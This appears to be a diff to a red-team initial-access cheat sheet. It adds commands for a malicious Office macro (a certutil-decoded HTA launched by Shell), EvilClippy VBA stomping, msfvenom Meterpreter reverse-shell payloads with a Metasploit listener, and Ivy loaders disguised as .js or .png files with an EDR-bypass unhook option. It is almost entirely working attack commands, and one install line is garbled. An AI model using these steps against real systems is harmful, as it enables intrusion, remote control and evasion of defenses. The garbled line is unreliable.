@@ -33,8 +33,8 @@ End With
 Shell ("cmd /c certutil -decode edr.cert edr.hta & start edr.hta")
 End Sub
 ```
-```
 
+```
 #### payload
 
 ```bash
@@ -57,4 +57,85 @@ $b64  | Out-File E:\Initial-Access\Macro\edr.cert
 msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
 ```
 
+## Evil clippy
 
+##### installation
+
+```
+git clone https://github.com/outflanknl/EvilClippy
+```
+
+```
+EvilClippy.exe -g secret-salary.xlsm
+```
+
+```
+EvilClippy.exe -u secret-salary.xlsm
+```
+
+```
+EvilClippy.exe -uu secret-salary.xlsm
+```
+
+## IVY
+
+#### Installation
+
+```
+hgo build Ivy.gottps://github.com/optiv/Ivy
+go get github.com/fatih/color
+go get github.com/KyleBanks/XOREncryption/Go
+go build Ivy.go
+```
+
+#### IVY Payload
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f vbs -o /var/www/html/shell.vbs
+```
+
+#### listener
+
+```
+msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
+```
+
+### Staged Payload
+
+```
+ivy -Ix86 shell.vbs -P Inject -O test.js
+```
+
+```
+cscript //E:jscript whatsapp.js
+```
+
+#### Stageless payload
+
+stageless payload
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f raw -o /var/www/html/shell.bin
+```
+
+```
+ivy  stageless -Ix86 shell.bin -P Inject -O test.js
+```
+
+#### onliner command
+
+```
+ivy  -stageless -Ix86 shell.bin -P Inject -O test.png
+```
+
+#### Bypass EDR
+
+```command
+ivy -stageless -Ix86 shell.bin -P Inject -unhook -O test.png
+```
+
+
+
+```
+
+```
